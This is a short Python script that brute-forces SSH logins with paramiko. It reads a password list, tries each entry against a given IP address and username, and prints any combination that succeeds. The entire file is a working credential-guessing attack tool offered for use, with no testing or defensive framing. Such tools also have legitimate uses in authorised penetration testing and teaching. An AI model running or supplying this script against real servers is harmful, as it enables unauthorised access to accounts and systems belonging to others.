import paramiko
import argparse


def ssh_bruteforce(ip, username, password_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    for password in passwords:
        try:
            print(f"Trying {username}-{password}")
            ssh.connect(ip, username=username, password=password)
            print(f"Successful login with {username}-{password}")

            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f" Failed with {username} - {password}")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            ssh.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force ssh login")

    parser.add_argument("ip", help="IP-adress for ssh-server")
    parser.add_argument("username", help="username for ssh-server")
    parser.add_argument("password_file", help="passwords to try")

    args = parser.parse_args()

    ssh_bruteforce(args.ip, args.username, args.password_file)